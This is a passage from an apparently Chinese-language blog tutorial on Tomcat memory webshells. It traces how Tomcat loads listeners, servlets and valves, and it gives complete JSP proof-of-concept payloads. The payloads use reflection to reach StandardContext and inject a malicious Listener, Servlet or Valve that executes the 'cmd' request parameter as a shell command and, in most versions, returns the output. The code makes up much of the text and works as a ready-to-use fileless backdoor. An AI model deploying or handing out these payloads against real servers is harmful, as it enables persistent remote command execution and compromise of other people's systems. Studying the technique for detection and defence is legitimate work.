还是从fireRequestInitEvent()方法说明：\n已经很好理解了，instances即listener“合集”，这里if判断必须是ServletRequestListener型才能成功调用到listener中的requestInitialized()方法。\nlistener中还实现了一次类型转换 这是必要的，因为ServletRequest一般我们利用的request就是这个类型。在这里调用的ServletRequestEvent类的getServletRequest()方法如下： 就是获取的ServletRequest类型的request。\n注入恶意代码：\n这里就是利用前面说过的setApplicationEventListeners()方法，需要注意的是这个方法接收一个Object数组： 所以需要将badListener设置为数组形式直接将前面设计好的listener加进去即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //获取StandardContext对象 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //编写恶意listener ServletRequestListener badListener = new ServletRequestListener(){ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;销毁\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { ServletRequest request = (ServletRequest)sre.getServletRequest(); String shell = request.getParameter(\u0026#34;cmd\u0026#34;); if(shell != null){ try { Runtime.getRuntime().exec(shell); } catch (IOException e) { e.printStackTrace(); } } } }; //注入恶意代码 standardContext.setApplicationEventListeners(new Object[]{badListener}); 还有的就是我看其他师傅的文章，注入恶意listener时好像都是用的addApplicatioinEventListener()方法，如下： 只是我这里用的setApplicationEventListeners()： 最终POC 加入到jsp中就是：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% //获取StandardContext对象 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //编写恶意listener ServletRequestListener badListener = new ServletRequestListener(){ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;销毁\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { ServletRequest request = (ServletRequest)sre.getServletRequest(); String shell = request.getParameter(\u0026#34;cmd\u0026#34;); if(shell != null){ try { Runtime.getRuntime().exec(shell); } catch (IOException e) { e.printStackTrace(); } } } }; //注入恶意代码 standardContext.setApplicationEventListeners(new Object[]{badListener}); //提示 out.println(\u0026#34;注入成功\u0026#34;); %\u0026gt; 然后访问injection.jsp： 成功注入，再随便请求资源加上参数： 成功命令执行。\n——————\n如果用addApplicationEventListener()方法的话就是如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% //获取StandardContext对象 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //编写恶意listener ServletRequestListener badListener = new ServletRequestListener(){ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;销毁\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { ServletRequest request = (ServletRequest)sre.getServletRequest(); String shell = request.getParameter(\u0026#34;cmd\u0026#34;); if(shell != null){ try { Runtime.getRuntime().exec(shell); } catch (IOException e) { e.printStackTrace(); } } } }; //注入恶意代码 standardContext.addApplicationEventListener(badListener); //提示 out.println(\u0026#34;注入成功\u0026#34;); %\u0026gt; 还是先访问jsp文件，再请求资源并进行命令执行： 成功执行。\nSevlet型内存马 同样的以一个简单的servlet来分析一下流程。\nweb.xml：\n1 2 3 4 5 6 7 8 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;Servlet.ServletTest\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/servlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; ServletTest.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package Servlet; import javax.servlet.*; import java.io.IOException; import java.util.Scanner; import java.io.InputStream; import java.io.PrintWriter; import javax.servlet.annotation.WebServlet; @WebServlet(value = \u0026#34;/servlet\u0026#34;,name = \u0026#34;ServletTest\u0026#34;) public class ServletTest implements Servlet { public void init(ServletConfig var1) throws ServletException{ } public ServletConfig getServletConfig(){ return null; } public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException{ System.out.println(\u0026#34;servlet启动\u0026#34;); String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } public String getServletInfo(){ return null; } public void destroy(){ } } 执行一下可以成功进行命令执行：\n这里的继承关系：\n1 2 3 4 5 6 7 Interface Servlet, ServletConfig ↓ abstract class GenericServlet ↓ class HttpServlet ↓ 自定义 Servlet 调试分析 （这里改成了maven项目来学习，将.class文件改为了.java文件）\n调试分析servlet的加载过程 在org.apache.catalins.core.StandardContext类的startInternal()方法中，首先调用了listenerStart()，接着是filterStart()，最后是loadOnstartup()。这三处调用触发了Listener、Filter、Servlet的构造加载。\n这里主要分析Servlet的加载，现在打断点于loadOnstartup()方法\n前面也说过了，在Container中的四个容器是存在父子关系的，而StandardContext是Context的实现类，所以这里很有可能这里的findChildren()方法就是寻找wrapper，也就是Sevlet。进入这个findChildren()方法： 进入到了StandardContext类的父类ContainerBase类，children变量的定义为：\nchildren是一个HashMap类实例，这里调用HashMap类的values()方法用来获取到HashMap中的value的集合。看一下这里的输出结果：\n这里有三个，一个default和JSP，应该都是自带的，在这里还可以看到我们自定义的ServletTest，基本可以确定这里的children就是存储Servlet的地方。\n所以这里的findChildren()方法就是获取到Servlet的Container类型的数组并返回。\n————\n再回到loadOnStartup()方法，方法定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public boolean loadOnStartup(Container children[]) { // Collect \u0026#34;load on startup\u0026#34; servlets that need to be initialized TreeMap\u0026lt;Integer,ArrayList\u0026lt;Wrapper\u0026gt;\u0026gt; map = new TreeMap\u0026lt;\u0026gt;(); for (Container child : children) { Wrapper wrapper = (Wrapper) child; int loadOnStartup = wrapper.getLoadOnStartup(); if (loadOnStartup \u0026lt; 0) { continue; } Integer key = Integer.valueOf(loadOnStartup); map.computeIfAbsent(key, k -\u0026gt; new ArrayList\u0026lt;\u0026gt;()).add(wrapper); } // Load the collected \u0026#34;load on startup\u0026#34; servlets for (ArrayList\u0026lt;Wrapper\u0026gt; list : map.values()) { for (Wrapper wrapper : list) { try { wrapper.load(); } catch (ServletException e) { getLogger().error( sm.getString(\u0026#34;standardContext.loadOnStartup.loadException\u0026#34;, getName(), wrapper.getName()), StandardWrapper.getRootCause(e)); // NOTE: load errors (including a servlet that throws // UnavailableException from the init() method) are NOT // fatal to application startup // unless failCtxIfServletStartFails=\u0026#34;true\u0026#34; is specified if (getComputedFailCtxIfServletStartFails()) { return false; } } } } return true; } 通读一下，还是比较好看懂的：\n先定义一个TreeMap类，然后使用for循环遍历传入的children变量，然后对对象调用getLoadOnStartup()方法： 也就是直接返回loadOnStartup，如果loadOnStartup \u0026lt; 0，就会直接进行下一个for循环，那么这里的loadOnstartup是什么？\n其实就是StandardWrapper类的一个变量，当是一个负数或者没有指定时，则表示服务器在该servlet被调用时才加载，我们点开这里的children：\n在服务器自带的servlet中为：\n在我自定义的Servlet中为：\n可以看出如果是我自定义的servlet，那么是肯定不会被加载的。但是这里的loadOnStartup其实是 web.xml 配置 Servlet 时的一个配置：\n1 \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; 并且在StandardWrapper类中还有个设置loadOnStartup值的方法： ————————\n然后回到loadOnStartup()方法： 如果条件允许，则会将这个wrapper放入到一个ArrayList型的map，再然后又调用for循环遍历这个map并调用load()方法加载。\n继续跟进这个load()方法： 这里调用了loadServlet()方法：\n重点就是我标注出来的东西，这里通过servletClass变量来装载servlet，并且这个方法最后就是返回这个servlet。\n继续分析这个loadServlet()后续代码：\n在后面还执行了一次初始化操作： 注意这里将装载后的servlet传进去了，继续跟进这个initServlet()方法：\n会调用servlet的init()方法，在这里就是自带的DefaultServlet类的init()方法： 完成初始化操作。同样的如果我们自定义的ServletTest可以满足loadOnStartup\u0026gt;=0，那么同样的会调用到这个init()方法用于初始化这个servlet。自己试了一下，web.xml改为如下即可：\n1 2 3 4 5 6 7 8 9 \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;Servlet.ServletTest\u0026lt;/servlet-class\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;ServletTest\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/servlet\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 可以自己调调，亲测可行。\n————\n在调用完init()方法后，还有个点说明一下： 后面还有一个将这个instanceInitialized赋值为true的语句。在前面这里的Wrapper的这个值都是false，只有这里才会将其改为true\n————\n然后继续回到load()方法： 调试了一下\n第一个if条件，不会进入，这个也是上面才说明的，有一串代码对其赋值： 所以第一个if语句是不会进入的\n第二个if条件中的isJspServlet就是判断是不是服务器自带的JSPServlet，不是就不会进入。 OK，servlet加载过程分析完毕。\n在上面提到了几个重要的点：\n在StardardContext调用findChildren()获取到Containter[]，然后for循环遍历得到wrapper，并对其进行load()操作\n在load()操作中，有两个点需要注意，一个是这个wrapper的loadOnStartup需要\u0026gt;=0\n还有个点就是利用到了servletClass，使用这个方法获取到了相对应的Servlet类\n——————\n调试分析servlet的初始化过程 在前面其实说明了比如要用到loadOnStartup、servletClass等变量，但是并没有说到怎么对这些变量进行赋值。这个板块主要就是用于解决这个问题。\n在 StandardWrapper#setServletClass() 方法处下断点，开始调试：\n可以看出在第一次启动时还是先初始化的自带的DefaultServlet，此时的部分调用栈：\n我们回溯到ContextConfig#configureContext()方法，简单看看，基本可以看出就是在读取web.xml中的数据：\n这里的context定义： 个人理解可以将其看作context实现类StandardContext类的实例。\n再看一下其中的一些方法：\n可以看出这里就是在整个tomcat初始化过程中对filter和listener的初始化。但这里的重点还是servlet： 这里调用了几个关键函数：createWrapper()、、setServletClass()。先来看createWrapper()方法，在这里打一个断点调试，进入到了StandardContext类的createWrapperr()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 @Override public Wrapper createWrapper() { Wrapper wrapper = null; if (wrapperClass != null) { try { wrapper = (Wrapper) wrapperClass.getConstructor().newInstance(); } catch (Throwable t) { ExceptionUtils.handleThrowable(t); log.error(sm.getString(\u0026#34;standardContext.createWrapper.error\u0026#34;), t); return null; } } else { wrapper = new StandardWrapper(); } synchronized (wrapperLifecyclesLock) { for (String wrapperLifecycle : wrapperLifecycles) { try { Class\u0026lt;?\u0026gt; clazz = Class.forName(wrapperLifecycle); LifecycleListener listener = (LifecycleListener) clazz.getConstructor().newInstance(); wrapper.addLifecycleListener(listener); } catch (Throwable t) { ExceptionUtils.handleThrowable(t); log.error(sm.getString(\u0026#34;standardContext.createWrapper.listenerError\u0026#34;), t); return null; } } } synchronized (wrapperListenersLock) { for (String wrapperListener : wrapperListeners) { try { Class\u0026lt;?\u0026gt; clazz = Class.forName(wrapperListener); ContainerListener listener = (ContainerListener) clazz.getConstructor().newInstance(); wrapper.addContainerListener(listener); } catch (Throwable t) { ExceptionUtils.handleThrowable(t); log.error(sm.getString(\u0026#34;standardContext.createWrapper.containerListenerError\u0026#34;), t); return null; } } } return wrapper; } 调试一下，会发现这里的wrapper会被赋值为 StandardWrapper 类实例： 返回结果为\n这个方法的重点也就是这个，可以将一个变量赋值为StandardWrapper类实例（其实也就是对应一个Servlet）。\n然后给这个wrapper设置内部值： 分别说明一下：\n调用了setLoadOnStartup()方法设置loadOnStartup变量， 调用setName()将ContainerBase类中的变量name赋值为一个值： 调用setServletClass()方法设置servletClass变量的值： 再继续往后面看： 当程序把这个Wrapper（理解为一个Servlet）设置好了后，将其加入到context的“子容器”中。重点关注addChild()方法和addServletMappingDecoded()方法，下面来分别进入看一下：\naddChild()：\n前面的代码就是判断是不是自带的jspServlet，这里是自带的DefaultSerrvlet，自然不是，重点是下面调用父类ContainerBase的addChild()方法，进入：\n会调用addChildInternal()方法： 重点还是如下代码： 先说明一下这里的if条件，这里需要程序对传进去的child使用getName()时的有回显，否则直接丢出异常：\n所以在前面说明的setName()函数设置名称还是非常有必要的。\n再就是if语句过后，先是给child设置了父类，在下面也可以看到相关值的情况。\n然后前面也说过了，这里的children是一个HashMap类实例，所以这里就是调用了put方法放进键值，和前面分析servlet加载流程的findChildren()方法形成闭环。\naddServletMappingDecoded()： 跟进一下getServletMappings()方法，返回了关键字servletMappings：\n搜一下这个关键字，可以看到一个非常有用的信息： 这里也有getValue()等函数，\n所以可以很清楚地知道前面的for循环就是遍历web.xml中的servlet-mapping的servlet-name和对应的url-pattern，然后调用addServletMappingDecode()方法形成映射。\n——————\n大概分析完毕，现在就是来尝试构造一下POC。\n总结一下在这一板块遇到的知识点：\n可以借鉴这里源码的方法，使用createWrapper()方法来创建一个Wrapper实例 然后再对其使用各种方法来“充实”里面的变量以达到在加载时可以调用出恶意Servlet 注入过程 恶意Servlet源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 Servlet badServlet = new Servlet(){ public void init(ServletConfig var1) throws ServletException{ } public ServletConfig getServletConfig(){ return null; } public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException{ System.out.println(\u0026#34;servlet启动\u0026#34;); String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } public String getServletInfo(){ return null; } public void destroy(){ } }; 获取StandardContext对象：\n1 2 3 4 5 6 7 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); 创建Wrapper：\n1 2 3 4 5 6 7 8 9 10 11 12 13 //预设置Servlet名称 String name = \u0026#34;123\u0026#34;; //名称随便 //获取StandardWrapper Wrapper wrapper = (Wrapper)standardContext.createWrapper(); //相关配置 wrapper.setName(name); wrapper.setLoadOnStartup(1); //wrapper.setServletClass(name); //有无无所谓 wrapper.setServlet(badServlet); //重点设置为Wrapper点在这里 //将其加入到当前环境的StandardContext中 standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(\u0026#34;/servlet\u0026#34;,name); 最终POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;javax.servlet.*\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Wrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% Servlet badServlet = new Servlet(){ public void init(ServletConfig var1) throws ServletException{ } public ServletConfig getServletConfig(){ return null; } public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException{ System.out.println(\u0026#34;servlet启动\u0026#34;); String cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;); boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } String[] cmds = isLinux ? new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd} : new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, cmd}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\a\u0026#34;); String output = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; PrintWriter out = servletResponse.getWriter(); out.println(output); out.flush(); out.close(); } public String getServletInfo(){ return null; } public void destroy(){ } }; ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //预设置Servlet名称 String name = badServlet.getClass().getName(); //名称随便 //获取StandardWrapper Wrapper wrapper = (Wrapper)standardContext.createWrapper(); //相关配置 wrapper.setName(name); wrapper.setLoadOnStartup(1); //wrapper.setServletClass(name); //有无无所谓 wrapper.setServlet(badServlet); //重点设置为Wrapper点在这里 //将其加入到当前环境的StandardContext中 standardContext.addChild(wrapper); standardContext.addServletMappingDecoded(\u0026#34;/servlet\u0026#34;,name); %\u0026gt; 开启服务器后还是同样的操作执行一遍即可，成功命令执行：\nValve 型内存马 在Tomcat中定义了两个接口，分别是Pipeline和Valve。Valve可以理解为Pipeline的基本单位，用于处理传入请求和传出请求。\nTomcat的管道机制是指在处理HTTP请求时，将一系列的Valve按顺序链接在一起形成一个处理管道。每个Valve负责在请求处理过程中执行特定的任务，例如认证、日志记录、安全性检查等。这样，请求就会在管道中依次经过每个Valve，每个Valve都可以对请求进行处理或者传递给下一个Valve\nTomcat每个层级的容器（Engine、Host、Context、Wrapper）都有相对应的实现Valve对象（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），这些Valve同时维护一个Pipeline实例（StandardPipeline）。在每个层级容器中的管道中都有至少有一个Valve，称之为基础阀，其作用是连接当前容器的下一个容器。\n看Valve接口的定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.apache.catalina; import java.io.IOException; import javax.servlet.ServletException; import org.apache.catalina.connector.Request; import org.apache.catalina.connector.Response; public interface Valve { //获取下一个Valve，null代表最后一个 Valve getNext(); //设置下一个Valve void setNext(Valve valve); void backgroundProcess(); //执行对应请求处理逻辑 void invoke(Request request, Response response) throws IOException, ServletException; boolean isAsyncSupported(); } 在Tomcat中的Valve实现类是ValveBase抽象类，其实现了大部分Valve接口的基本方法，只需要重写invoke()方法。\n而看Pipeline接口的实现类StandardPipeline，其定义有addValve()方法： 而在前面说过，Container的四个容器都是有其相对应的Valve的，看了一下，四个容器的实现类StandardEngine、StandardHost等都是继承于ContainerBase类的，并且这个ContainerBase类中有addValve()方法： 其实也就是调用的StandardPipeline类的addValve()方法：\n————\n现在就可以尝试来直接构造了，过程：\n反射从HttpRequestServlet 获取 Request 反射从 Request 获取StandardContext 获取到了StandardContext就可以尝试直接向里面添加恶意Valve了。 获取StandardContext等四个容器对象都可以：\n1 2 3 4 5 6 Field requestField = request.getClass().getDeclaredField(\u0026#34;request\u0026#34;); requestField.setAccessible(true); Request request1 = (Request) requestField.get(request); StandardContext standardContext = (StandardContext) request1.getContext(); // StandardHost standardHost = (StandardHost) request1.getHost(); // StandardWrapper standardWrapper = (StandardWrapper) request1.getWrapper(); 但我是tomcat9，应该是用不了这个，还是回到之前那个获取StandardContext()方法：\n1 2 3 4 5 6 7 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); 定义恶意Valve：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ValveBase badValve = new ValveBase() { public void invoke(Request req, Response resp){ try { if (req.getParameter(\u0026#34;cmd\u0026#34;) != null) { boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } InputStream in = isLinux ? (Runtime.getRuntime().exec(new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()) : (Runtime.getRuntime().exec(new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\A\u0026#34;); String o = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; resp.getWriter().write(o); } this.getNext().invoke(req, resp); } catch (Exception e) { e.printStackTrace(); } } }; 然后直接加入即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); ValveBase badValve = new ValveBase() { public void invoke(Request req, Response resp){ try { if (req.getParameter(\u0026#34;cmd\u0026#34;) != null) { boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } InputStream in = isLinux ? (Runtime.getRuntime().exec(new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()) : (Runtime.getRuntime().exec(new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\A\u0026#34;); String o = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; resp.getWriter().write(o); } this.getNext().invoke(req, resp); } catch (Exception e) { e.printStackTrace(); } } }; standardContext.addValve(badValve); 最终POC index.jsp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;javax.servlet.*\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Request\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.valves.ValveBase\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Response\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); ValveBase badValve = new ValveBase() { public void invoke(Request req, Response resp){ try { if (req.getParameter(\u0026#34;cmd\u0026#34;) != null) { boolean isLinux = true; String osTyp = System.getProperty(\u0026#34;os.name\u0026#34;); if (osTyp != null \u0026amp;\u0026amp; osTyp.toLowerCase().contains(\u0026#34;win\u0026#34;)) { isLinux = false; } InputStream in = isLinux ? (Runtime.getRuntime().exec(new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()) : (Runtime.getRuntime().exec(new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;,req.getParameter(\u0026#34;cmd\u0026#34;)}).getInputStream()); Scanner s = new Scanner(in).useDelimiter(\u0026#34;\\\\A\u0026#34;); String o = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; resp.getWriter().write(o); } this.getNext().invoke(req, resp); } catch (Exception e) { e.printStackTrace(); } } }; standardContext.addValve(badValve); //提示注入 out.println(\u0026#34;success inject\u0026#34;); 